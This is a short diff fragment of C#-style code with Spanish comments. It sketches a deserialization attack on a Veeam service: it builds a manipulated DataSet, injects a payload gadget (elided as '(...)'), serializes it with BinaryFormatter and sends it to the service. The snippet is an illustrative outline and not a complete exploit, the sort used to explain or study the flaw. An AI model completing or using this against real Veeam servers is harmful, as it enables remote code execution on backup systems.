@@ -1,0 +1,8 @@
+// Construcción de un objeto DataSet manipulado
+var ds = new xmlFrameworkDs(); 
+// Inyectar payload en el DataSet
+ds.ExtendedProperties["Payload"] = new PayloadGadget(...);
+var ms = new MemoryStream();
+var bf = new BinaryFormatter();
+bf.Serialize(ms, ds);
+SendToVeeamService(ms.ToArray());
